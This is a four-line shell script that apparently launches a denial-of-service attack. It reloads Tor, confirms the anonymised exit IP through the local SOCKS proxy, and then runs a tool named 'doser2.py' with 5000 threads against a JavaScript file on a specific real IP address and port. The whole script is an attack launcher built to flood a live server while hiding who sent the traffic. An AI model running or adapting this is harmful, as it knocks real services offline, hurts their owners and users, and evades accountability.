#!/bin/sh
service tor reload &>/dev/null
curl --socks5 127.0.0.1:9050 ip.p3terx.com
python3 doser2.py -g 'http://51.222.105.32:81/static/app-assets/vendors/js/vendors.min.js' -t 5000
